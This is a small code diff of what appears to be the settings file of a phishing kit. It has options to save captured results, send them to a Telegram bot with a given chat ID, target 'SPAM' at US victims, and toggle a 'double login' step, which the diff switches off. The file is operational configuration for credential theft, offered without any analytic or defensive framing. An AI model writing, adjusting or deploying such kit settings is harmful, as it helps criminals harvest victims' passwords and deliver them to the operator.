@@ -12,7 +12,7 @@ $settings = array(
 	"save_results"	=> "1",	// Save Results 
 	"telegram"		=> "1",	// Telegram Bots Receiver
 	"country"		=> "US", // Target SPAM Country
-	"double_login"	=> "1", // double login
+	"double_login"	=> "0", // double login
 
 
 	"chat_id"		=> "8755902208",	// Chat ID Of You
